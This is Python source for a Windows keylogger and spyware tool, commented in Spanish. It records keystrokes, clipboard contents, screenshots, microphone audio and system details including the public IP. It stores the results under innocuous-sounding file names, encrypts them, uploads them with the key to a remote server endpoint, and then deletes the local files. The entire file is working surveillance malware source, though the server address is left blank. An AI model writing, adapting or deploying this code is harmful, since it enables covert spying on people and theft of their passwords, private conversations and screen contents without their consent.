import socket
import platform
import win32clipboard
import requests
import time
import os
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from PIL import ImageGrab
import json
import logging
import sys
import winreg
import sys

# Configuración de logging para depuración
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("keylogger_debug.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

# Configuración de archivos
keys_information = "key_log.txt"
system_information = "sysinfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
audio_information = "audio.wav"


# Configuración de archivos encriptados
key = Fernet.generate_key() # Clave de encriptación Fernet
keys_information_e = "settings_backup.txt"
system_information_e = "aplication_log.txt"
clipboard_information_e = "temp_data.txt"

# Configuración de tiempo
time_iteration = 15
microphone_time = 10
iterations_end = 3

# Configuración de rutas
username = getpass.getuser()
file_path = f"C:\\Users\\{username}\\AppData\\Roaming\\"
extend = "\\"
file_merge = file_path + extend
key_file = file_merge + "encryption_key.txt"

# Configuración del servidor
server_url = ""

# Función para obtener información del sistema
def computer_information():
    logging.info("Recopilando información del sistema...")
    try:
        with open(file_merge + system_information, "w") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            
            try:
                public_ip = requests.get("https://api.ipify.org").text
                f.write("Dirección IP(Pública): " + public_ip + '\n')
            except Exception as e:
                f.write("No se pudo obtener la dirección IP pública\n")
                logging.error(f"Error obteniendo IP pública: {e}")
            
            f.write("Procesador: " + platform.processor() + '\n')
            f.write("Sistema: " + platform.system() + " " + platform.version() + '\n')
            f.write("Máquina: " + platform.machine() + '\n')
            f.write("Nombre del Host: " + hostname + '\n')
            f.write("Dirección IP(Privada): " + IPAddr + '\n')
        
        logging.info(f"Información del sistema guardada en {file_merge + system_information}")
        return True
    except Exception as e:
        logging.error(f"Error al recopilar información del sistema: {e}")
        return False

# Función para copiar el portapapeles
def copy_clipboard():
    logging.info("Copiando contenido del portapapeles...")
    try:
        with open(file_merge + clipboard_information, "w") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Portapapeles: \n" + pasted_data)
            except Exception as e:
                f.write("El portapapeles no se pudo copiar\n")
                logging.error(f"Error accediendo al portapapeles: {e}")
        
        logging.info(f"Contenido del portapapeles guardado en {file_merge + clipboard_information}")
        return True
    except Exception as e:
        logging.error(f"Error al guardar el portapapeles: {e}")
        return False

# Función para grabar audio del micrófono
def microphone():
    logging.info(f"Grabando audio durante {microphone_time} segundos...")
    try:
        fs = 44100
        seconds = microphone_time
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_merge + audio_information, fs, myrecording)
        logging.info(f"Audio grabado en {file_merge + audio_information}")
        return True
    except Exception as e:
        logging.error(f"Error grabando audio: {e}")
        return False

# Función para tomar capturas de pantalla
def screenshot():
    logging.info("Tomando captura de pantalla...")
    try:
        im = ImageGrab.grab()
        im.save(file_merge + screenshot_information)
        logging.info(f"Captura guardada en {file_merge + screenshot_information}")
        return True
    except Exception as e:
        logging.error(f"Error tomando captura: {e}")
        return False

# Función para generar metadatos
def generate_metadata():
    return {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "platform_version": platform.version(),
        "processor": platform.processor(),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "client_id": f"vm_{username}"
    }


# Función para encriptar archivos
def encrypt_files(fernet):
    logging.info("Iniciando encriptación de archivos...")
    encrypted_files = []
    
    files_to_encrypt = [
        file_merge + system_information,
        file_merge + clipboard_information,
        file_merge + keys_information
    ]
    
    encrypted_file_names = [
        file_merge + system_information_e,
        file_merge + clipboard_information_e,
        file_merge + keys_information_e
    ]
    
    for i, file_path in enumerate(files_to_encrypt):
        try:
            if not os.path.exists(file_path):
                logging.warning(f"Archivo a encriptar no existe: {file_path}")
                continue
                
            with open(file_path, 'rb') as f:
                data = f.read()
            
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            
            with open(encrypted_file_names[i], 'wb') as f:
                f.write(encrypted)
            
            logging.info(f"Archivo encriptado: {encrypted_file_names[i]}")
            encrypted_files.append(encrypted_file_names[i])
        except Exception as e:
            logging.error(f"Error encriptando {file_path}: {e}")
    
    return encrypted_files

# Función para enviar archivos al servidor
def send_files_to_server(encrypted_files, key_file):
    logging.info(f"Enviando archivos al servidor: {server_url}")
    
    # Verificar que tenemos exactamente 3 archivos encriptados
    if len(encrypted_files) != 3:
        logging.warning(f"Se esperaban 3 archivos encriptados, pero hay {len(encrypted_files)}")
        # Rellenar con archivos vacíos si es necesario
        while len(encrypted_files) < 3:
            temp_file = file_merge + f"empty_{len(encrypted_files)}.txt"
            with open(temp_file, 'w') as f:
                f.write("placeholder")
            encrypted_files.append(temp_file)
    
    # Verificar que los archivos de imagen y audio existen
    image_file = file_merge + screenshot_information
    audio_file = file_merge + audio_information
    
    if not os.path.exists(image_file):
        logging.warning(f"Archivo de imagen no existe: {image_file}")
        # Crear un archivo de imagen de prueba
        try:
            from PIL import Image
            img = Image.new('RGB', (100, 100), color = (73, 109, 137))
            img.save(image_file)
            logging.info(f"Creado archivo de imagen de prueba: {image_file}")
        except Exception as e:
            logging.error(f"No se pudo crear imagen de prueba: {e}")
    
    if not os.path.exists(audio_file):
        logging.warning(f"Archivo de audio no existe: {audio_file}")
        # Crear un archivo de audio de prueba
        try:
            import numpy as np
            fs = 44100
            duration = 1  # 1 segundo
            dummy_audio = np.zeros((int(fs * duration), 2))
            write(audio_file, fs, dummy_audio)
            logging.info(f"Creado archivo de audio de prueba: {audio_file}")
        except Exception as e:
            logging.error(f"No se pudo crear audio de prueba: {e}")
    
    try:
        # Preparar los archivos para la solicitud
        files = {
            'text_file1': open(encrypted_files[0], 'rb'),
            'text_file2': open(encrypted_files[1], 'rb'),
            'text_file3': open(encrypted_files[2], 'rb'),
            'image_file': open(image_file, 'rb'),
            'audio_file': open(audio_file, 'rb'),
            'encryption_key': open(key_file, 'rb')
        }
        
        # Preparar metadatos
        metadata = generate_metadata()
        data = {'metadata': json.dumps(metadata)}
        
        # Enviar la solicitud
        logging.info("Enviando solicitud POST al servidor...")
        response = requests.post(f"{server_url}/upload_batch", files=files, data=data)
        
        # Cerrar todos los archivos
        for f in files.values():
            f.close()
        
        # Verificar la respuesta
        if response.status_code == 200:
            logging.info(f"Archivos enviados correctamente: {response.text[:100]}...")
            return True
        else:
            logging.error(f"Error en la respuesta del servidor: {response.status_code} - {response.text}")
            return False
    except Exception as e:
        logging.error(f"Error enviando archivos al servidor: {e}")
        return False

# Función para limpiar archivos
def cleanup_files():
    logging.info("Limpiando archivos...")
    files_to_delete = [
        system_information,
        clipboard_information,
        keys_information,
        screenshot_information,
        audio_information,
        system_information_e,
        clipboard_information_e,
        keys_information_e,
        key_file
    ]
    
    for file in files_to_delete:
        try:
            file_path = file_merge + file
            if os.path.exists(file_path):
                os.remove(file_path)
                logging.info(f"Archivo eliminado: {file_path}")
            else:
                logging.warning(f"El archivo no existe para eliminar: {file_path}")
        except Exception as e:
            logging.error(f"Error eliminando archivo {file}: {e}")

# Función principal para registro de teclado
def keylogger():
    logging.info("Iniciando keylogger...")
    iterations = 0
    
    while iterations < iterations_end:
        count = 0
        keys = []
        
        currentTime = time.time()
        stopTime = time.time() + time_iteration
        
        # Registrar pulsaciones de teclas durante el tiempo establecido
        def on_press(key):
            global count, keys, currentTime
            logging.debug(f"Tecla presionada: {key}")
            keys.append(key)
            count += 1
            currentTime = time.time()
            
            if count >= 1:
                count = 0
                # Escribir teclas al archivo
                with open(file_merge + keys_information, "a") as f:
                    for k in keys:
                        k_str = str(k).replace("'", "")
                        if k_str.find("space") > 0:
                            f.write('\n')
                        elif k_str.find("Key") == -1:
                            f.write(k_str)
                keys.clear()
        
        def on_release(key):
            if key == Key.esc:
                return False
            if time.time() > stopTime:
                return False
        
        # Iniciar el listener
        try:
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except Exception as e:
            logging.error(f"Error en el listener de teclado: {e}")
        
        # Limpiar archivo de teclas para la siguiente iteración
        with open(file_merge + keys_information, "w") as f:
            f.write("")
        
        # Tomar nueva captura de pantalla y copiar portapapeles
        screenshot()
        copy_clipboard()
        
        # Incrementar iteraciones
        iterations += 1
        logging.info(f"Completada iteración {iterations} de {iterations_end}")

# Función principal
def main():
    logging.info("=== INICIANDO KEYLOGGER ===")
    
    # Crear directorio de trabajo si no existe
    os.makedirs(file_merge, exist_ok=True)
    
    # Recopilar información inicial
    computer_information()
    copy_clipboard()
    
    # Tomar captura de pantalla
    screenshot()
    
    # Grabar audio del micrófono
    microphone()
    
    # Iniciar keylogger
    keylogger()
    
    # Encriptar archivos
    with open(key_file,'wb') as f:
        f.write(key)
    fernet = Fernet(key)
    encrypted_files = encrypt_files(fernet)
    
    # Enviar archivos al servidor
    send_success = send_files_to_server(encrypted_files, key_file)
    logging.info(f"Resultado del envío: {'Éxito' if send_success else 'Fallido'}")
    
    # Esperar un momento antes de limpiar para poder verificar
    logging.info("Esperando 10 segundos antes de limpiar...")
    time.sleep(10)
    
    # Limpiar archivos
    cleanup_files()
    os.remove(key_file)
    logging.info("=== KEYLOGGER FINALIZADO ===")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.critical(f"Error fatal en la aplicación: {e}")
